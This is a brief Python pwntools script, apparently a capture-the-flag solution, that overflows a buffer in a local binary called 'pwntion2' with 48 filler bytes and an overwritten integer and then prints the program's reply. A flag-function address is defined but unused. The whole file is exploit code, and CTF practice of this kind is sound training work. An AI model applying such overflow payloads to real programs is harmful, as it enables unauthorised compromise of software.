from pwn import *

e = ELF('./pwntion2')
p = process('./pwntion2')

cat_flag_addr = 0x08048809

payload ="A"*48
payload += '\x01\x00\x00\x00'

print p.recvuntil('Student:\n> ')
p.sendline(payload)
print p.recv()